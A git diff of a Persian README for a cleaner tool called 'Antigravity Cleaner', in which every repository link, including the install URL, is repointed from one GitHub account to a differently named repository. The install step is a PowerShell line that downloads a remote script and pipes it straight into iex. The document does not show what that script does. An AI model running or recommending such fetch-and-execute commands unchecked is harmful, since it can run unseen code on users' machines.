@@ -4,9 +4,9 @@
   <img src="docs/images/banner.png" alt="Antigravity Cleaner Banner" width="100%">
   <br>
 
-  [![Version](https://img.shields.io/badge/Version-4.1.0-blue?style=for-the-badge)](https://github.com/tawroot/antigravity-cleaner/releases)
+  [![Version](https://img.shields.io/badge/Version-4.1.0-blue?style=for-the-badge)](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/releases)
   [![License](https://img.shields.io/badge/License-TACL-red.svg?style=for-the-badge)](docs/LICENSE.md)
-  [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg?style=for-the-badge&logo=platform.sh)](https://github.com/tawroot/antigravity-cleaner)
+  [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg?style=for-the-badge&logo=platform.sh)](https://github.com/LCW0NJUPT/antigravity-cleaner-macos)
   [![Language](https://img.shields.io/badge/Language-PowerShell-yellow.svg?style=for-the-badge&logo=powershell)]()
   [![Security](https://img.shields.io/badge/Security-Zero%20Telemetry-green.svg?style=for-the-badge&logo=shields)](docs/SECURITY.md)
 </div>
@@ -69,7 +69,7 @@
 (این دستور به طور خودکار برنامه را دانلود کرده و یک آیکون روی دسکتاپ شما می‌سازد)
 
 ```powershell
-iwr https://raw.githubusercontent.com/tawroot/antigravity-cleaner/main/install.ps1 -useb | iex
+iwr https://raw.githubusercontent.com/LCW0NJUPT/antigravity-cleaner-macos/main/install.ps1 -useb | iex
 ```
 
 *اگر با خطا مواجه شدید، ترمینال را به صورت Administrator اجرا کنید.*
@@ -157,11 +157,11 @@ iwr https://raw.githubusercontent.com/tawroot/antigravity-cleaner/main/install.p
 ## 📈 رشد پروژه (Star History)
 اگر این ابزار برایتان مفید بود، با دادن ستاره (Star) به ما انرژی بدهید!
 <br>
-<a href="https://star-history.com/#tawroot/antigravity-cleaner&Date">
+<a href="https://star-history.com/#LCW0NJUPT/antigravity-cleaner-macos&Date">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=tawroot/antigravity-cleaner&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=tawroot/antigravity-cleaner&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=tawroot/antigravity-cleaner&type=Date" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date&theme=dark" />
+   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date" />
+   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=LCW0NJUPT/antigravity-cleaner-macos&type=Date" />
  </picture>
 </a>
 
@@ -192,16 +192,16 @@ iwr https://raw.githubusercontent.com/tawroot/antigravity-cleaner/main/install.p
 ما از پیشنهادات و گزارش باگ‌ها استقبال می‌کنیم!
 
 **نحوه مشارکت:**
-1.  **پیشنهاد قابلیت جدید:** در بخش [Discussions](https://github.com/tawroot/antigravity-cleaner/discussions) گیت‌هاب مطرح کنید.
-2.  **گزارش باگ:** در بخش [Issues](https://github.com/tawroot/antigravity-cleaner/issues) با جزئیات کامل ثبت کنید.
+1.  **پیشنهاد قابلیت جدید:** در بخش [Discussions](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/discussions) گیت‌هاب مطرح کنید.
+2.  **گزارش باگ:** در بخش [Issues](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/issues) با جزئیات کامل ثبت کنید.
 3.  **کد:** به دلیل ماهیت اختصاصی لایسنس، متأسفانه Pull Request پذیرفته نمی‌شود، اما نظرات و ایده‌های شما بسیار ارزشمند است!
 
 ---
 
 ## 📞 تماس و انجمن
 *   **کانال تلگرام:** [t.me/panbehnet](https://t.me/panbehnet) - اخبار، نکات و پشتیبانی.
-*   **GitHub Issues:** [گزارش مشکلات](https://github.com/tawroot/antigravity-cleaner/issues).
-*   **GitHub Discussions:** [گفتگو با جامعه](https://github.com/tawroot/antigravity-cleaner/discussions).
+*   **GitHub Issues:** [گزارش مشکلات](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/issues).
+*   **GitHub Discussions:** [گفتگو با جامعه](https://github.com/LCW0NJUPT/antigravity-cleaner-macos/discussions).
 
 ---
 
